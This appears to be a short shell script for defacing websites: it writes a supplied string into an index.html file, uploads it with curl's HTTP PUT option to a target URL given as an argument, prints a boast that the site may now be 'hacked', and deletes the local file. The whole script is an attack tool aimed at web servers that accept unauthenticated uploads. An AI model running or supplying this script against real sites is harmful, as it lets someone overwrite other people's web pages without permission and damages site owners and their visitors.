echo $1 > index.html
curl -T index.html $2
echo "```Maybe website already hacked.. check at ur browser! ```🫠"
rm index.html
